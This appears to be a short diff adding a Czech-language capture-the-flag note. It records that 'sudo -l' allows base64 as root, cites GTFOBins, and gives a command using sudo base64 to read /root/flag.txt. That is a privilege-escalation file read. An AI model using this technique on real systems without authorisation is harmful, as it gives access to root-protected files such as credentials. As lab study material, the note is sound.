@@ -1,0 +1,6 @@
+skrze `sudo -l` zjistime ze muzeme mit sudo na base64
+
+https://gtfobins.github.io/gtfobins/base64/
+
+sudo base64 /root/flag.txt | base64 -d
+
